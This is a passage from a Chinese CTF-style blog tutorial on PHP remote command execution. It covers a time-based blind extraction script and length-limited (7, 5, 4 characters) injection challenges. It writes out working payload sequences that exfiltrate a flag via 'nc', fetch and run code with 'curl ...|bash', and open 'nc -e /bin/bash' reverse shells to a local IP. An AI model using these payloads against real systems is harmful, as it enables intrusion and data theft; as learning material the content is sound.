+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ $(cat flag.txt|awk NR==1|cut -c 1)==f ];then sleep 2;fi</span><br></pre></td></tr></table></figure>
+
+<p>如果条件为真，那么延迟两秒响应，这里是橙子科技给的python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;/*目标URL*/&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=<span class="built_in">chr</span>(k)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            payload=<span class="string">&quot;?cmd=(传参格式)&quot;</span>+<span class="string">&quot;if [ `ls|awk NR==&#123;i&#125;|cut -c &#123;j&#125;`==&#123;k&#125; ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url+payload,timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result=result+k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result +=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要修改的就是目标URL和传参格式以及命令</p>
+<h1 id="限制长度的RCE"><a href="#限制长度的RCE" class="headerlink" title="限制长度的RCE"></a>限制长度的RCE</h1><p>这一part本人的docker有点问题就没有演示了<strong>orz</strong></p>
+<h2 id="限制长度为7"><a href="#限制长度为7" class="headerlink" title="限制长度为7"></a>限制长度为7</h2><p>例题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\*|\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">7</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要的命令符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 创建不超过七个长度的文件名</span><br><span class="line">ls -t 按时间顺序列出文件名，按行储存</span><br><span class="line">\ 连接换行命令</span><br><span class="line">sh 从文件中读取命令</span><br></pre></td></tr></table></figure>
+
+<p>期望执行的命令：<code>cat flag|nc /*IP*/ 7777</code>比如：<code>cat flag|nc 192.168.1.161 7777</code></p>
+<p>我们的逻辑是将这一串命令分隔为几部分作为文件名，这些文件名用<code>ls -t</code>会按被创建的时间顺序排列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;ZL</span><br><span class="line">&gt;AR</span><br><span class="line">&gt;YY</span><br><span class="line">最后ls查看结果为：</span><br><span class="line">YY AR ZL</span><br></pre></td></tr></table></figure>
+
+<p>当我们按倒序创建文件之后，就可以利用<code>ls -t&gt;a</code>将这些文件放在a文件中，最后<code>sh a</code>就可以执行需要的命令了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;7777</span><br><span class="line">?cmd=&gt;\ \\</span><br><span class="line">//在创建文件名时利用到的空格和反斜杠和管道符都需要被转义</span><br><span class="line">?cmd=&gt;161\\</span><br><span class="line">?cmd=&gt;1.\\</span><br><span class="line">?cmd=&gt;168.\\</span><br><span class="line">?cmd=&gt;192.\\</span><br><span class="line">?cmd=&gt;c\ \\</span><br><span class="line">?cmd=&gt;\|n\\</span><br><span class="line">?cmd=&gt;flag\\</span><br><span class="line">?cmd=&gt;t\ \\</span><br><span class="line">?cmd=&gt;ca\\</span><br><span class="line">?cmd=ls -t&gt;a</span><br><span class="line">?cmd=sh a</span><br></pre></td></tr></table></figure>
+
+<p>首先要开启kali监听：<code>nc -lvp 7777</code></p>
+<h2 id="长度为5"><a href="#长度为5" class="headerlink" title="长度为5"></a>长度为5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\*|\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于长度为5的限制，导致<code>ls -t&gt;a</code>无法使用，并且如果写为文件名为空格的话也只能写一次，因为文件名不能重复<code>&gt;\ \\</code>（长度刚好为5），所以需要更换期望执行的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.1.161|bash</span><br></pre></td></tr></table></figure>
+
+<p>同时还需要kali开启一个web服务默认index.html页面内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.161 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>然后执行curl命令就会下载默认页面的html内容并通过管道符交给bash执行，那么此时kali再开启监听就能看到命令执行的结果</p>
+<p>不过由于无法使用<code>ls -t&gt;a</code>，那我们首先还需要构造这一串命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;ls\\</span><br><span class="line">ls&gt;_</span><br><span class="line">//由于默认排序ls\\会被排在最后面，所以就需要把他写入到名字为_的文件里面</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br><span class="line">//采用追加&gt;&gt;的写法将剩下的命令写入_</span><br></pre></td></tr></table></figure>
+
+<p>然后就是构造命令了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;61\\</span><br><span class="line">&gt;1\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;68\\</span><br><span class="line">&gt;2.\\</span><br><span class="line">&gt;19\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line"></span><br><span class="line">sh _</span><br><span class="line">//实际上就是执行ls -t&gt;y</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">touch index.html</span><br><span class="line">vim index.html</span><br><span class="line">//在index.html里面写入：nc 192.168.1.161 7777 -e /bin/bash</span><br><span class="line">python -m http.server 80</span><br><span class="line"></span><br><span class="line">//这个是创建index.html页面</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度为4"><a href="#长度为4" class="headerlink" title="长度为4"></a>长度为4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/\*|\?|/&quot;</span>,<span class="string">&quot;=====&quot;</span>,<span class="variable">$argv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">4</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag in local path flag file!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>长度为4导致<code>ls&gt;&gt;_</code>不能使用</p>
+<p>首先还是需要构造ls -t&gt;g，其次我们需要构造反弹shell：curl 192.168.1.161|bash的变形：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 0xC0A801A1|bash //IP地址的的十六进制</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir 按列输出文件名，不换行</span><br><span class="line">* 相当于$(dir *)</span><br><span class="line">//*如果第一个文件名是命令的话就会执行命令，返回执行的结果，之后的文件名作为参数传入</span><br><span class="line">rev 可以反转文件每一行的内容</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">//加上h不影响命令ls -th的执行，但是可以让生成的文件名ht-排列在sl前面</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;dir</span><br><span class="line">*&gt;v</span><br><span class="line">//这里cat v会看到：g&gt; ht- sl，所以需要把他们写入文件使用rev v，但长度为5</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line">//这里的*为通配符，前可以匹配rev，后可以执行v</span><br><span class="line">//最后x的内容就是ls -th &gt;g</span><br></pre></td></tr></table></figure>
+
+<p><strong>同时为了防止g后面有其它文件名造成影响，可以多创建一个文件<code>g\;</code>用<code>;</code>去隔断后面字符的影响</strong></p>
+<p>然后就是创建curl命令的文件了，最后执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh x</span><br><span class="line">sh g</span><br></pre></td></tr></table></figure>
+
+<p>与限制长度为5一样需要kali开启index.html</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ZLARYY123.github.io">ZLARYY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://zlaryy123.github.io/2026/02/28/RCE/">https://zlaryy123.github.io/2026/02/28/RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avertar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/22/SQL/" title="SQL"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">SQL</div></div><div class="info-2"><div class="info-item-1">SQL所谓SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的 查询字符串，最终达到欺骗服务器执行恶意的SQL命令，从而进一步得到相应的数据信息。 字符型注入字符型注入需要闭合符 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;  提交&#x2F;?id&#x3D;1’ and  1&#x3D;1结果为： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=1&#x27; LIMIT 0,1&quot;;  这时候就多出来了一个’，所以我们需要用注释符（–+或%23或#）将后面的内容注释掉 常见的闭合符有：’  “  ‘)  “)  其他 假设我们无法查看源码的时候我们怎么判断闭合符是什么： 我们可以尝试输入两种不同的闭合符：   我们传入的内容是/?id=1&#39;&quot; 报错内容是： 1You have an error in your SQL syntax; check the ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avertar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ZLARYY</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZLARYY123"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">1.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6%E5%8F%B7%EF%BC%88Linux%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">命令拼接符号（Linux）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E8%BF%9E%E6%8E%A5%E7%AC%A6%EF%BC%88windows%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">系统命令连接符（windows）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">系统命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#system"><span class="toc-number">4.1.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passthru"><span class="toc-number">4.2.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec"><span class="toc-number">4.3.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-exec"><span class="toc-number">4.4.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#popen"><span class="toc-number">4.5.</span> <span class="toc-text">popen()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proc-open"><span class="toc-number">4.6.</span> <span class="toc-text">proc_open()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">4.7.</span> <span class="toc-text">pcntl_exec()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval"><span class="toc-number">5.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#assert"><span class="toc-number">6.</span> <span class="toc-text">assert</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#preg-replace"><span class="toc-number">7.</span> <span class="toc-text">preg_replace</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%AF%E5%8F%98%E5%87%BD%E6%95%B0"><span class="toc-number">8.</span> <span class="toc-text">php可变函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#create-function"><span class="toc-number">9.</span> <span class="toc-text">create_function</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#call-user-func"><span class="toc-number">10.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">11.</span> <span class="toc-text">call_user_func_array</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#array-map"><span class="toc-number">12.</span> <span class="toc-text">array_map</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">常规绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">13.1.</span> <span class="toc-text">空格过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">13.2.</span> <span class="toc-text">关键字过滤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97RCE"><span class="toc-number">14.</span> <span class="toc-text">无字母无数字RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">14.1.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">14.2.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">14.3.</span> <span class="toc-text">自增</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">15.</span> <span class="toc-text">无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-number">15.1.</span> <span class="toc-text">请求头绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-php5-7"><span class="toc-number">15.2.</span> <span class="toc-text">全局变量(php5&#x2F;7)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session"><span class="toc-number">15.3.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#scandir%E8%AF%BB%E5%8F%96"><span class="toc-number">15.4.</span> <span class="toc-text">scandir读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scandir"><span class="toc-number">15.4.1.</span> <span class="toc-text">scandir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getcwd"><span class="toc-number">15.4.2.</span> <span class="toc-text">getcwd()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#current-%E4%B8%8Enext"><span class="toc-number">15.4.3.</span> <span class="toc-text">current()与next()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-reverse"><span class="toc-number">15.4.4.</span> <span class="toc-text">array_reverse()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#array-flip-%E4%B8%8Earray-rand"><span class="toc-number">15.4.5.</span> <span class="toc-text">array_flip()与array_rand()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chdir"><span class="toc-number">15.4.6.</span> <span class="toc-text">chdir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strrev"><span class="toc-number">15.4.7.</span> <span class="toc-text">strrev()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypt"><span class="toc-number">15.4.8.</span> <span class="toc-text">crypt()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hebrevc"><span class="toc-number">15.4.9.</span> <span class="toc-text">hebrevc()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#localeconv"><span class="toc-number">15.4.10.</span> <span class="toc-text">localeconv()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirname"><span class="toc-number">15.4.11.</span> <span class="toc-text">dirname()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">15.4.12.</span> <span class="toc-text">根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ord-%E4%B8%8Echr"><span class="toc-number">15.4.13.</span> <span class="toc-text">ord()与chr()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">16.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E7%9A%84RCE"><span class="toc-number">17.</span> <span class="toc-text">限制长度的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E4%B8%BA7"><span class="toc-number">17.1.</span> <span class="toc-text">限制长度为7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E4%B8%BA5"><span class="toc-number">17.2.</span> <span class="toc-text">长度为5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E4%B8%BA4"><span class="toc-number">17.3.</span> <span class="toc-text">长度为4</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/28/RCE/" title="RCE">RCE</a><time datetime="2026-02-28T07:45:00.000Z" title="Created 2026-02-28 15:45:00">2026-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/22/SQL/" title="SQL">SQL</a><time datetime="2026-02-22T06:50:00.000Z" title="Created 2026-02-22 14:50:00">2026-02-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化">php反序列化</a><time datetime="2026-02-16T04:00:00.000Z" title="Created 2026-02-16 12:00:00">2026-02-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/12/SSRF/" title="SSRF">SSRF</a><time datetime="2026-02-12T07:06:00.000Z" title="Created 2026-02-12 15:06:00">2026-02-12</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By ZLARYY</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async data-pjax src="/"></script></div></body></html>
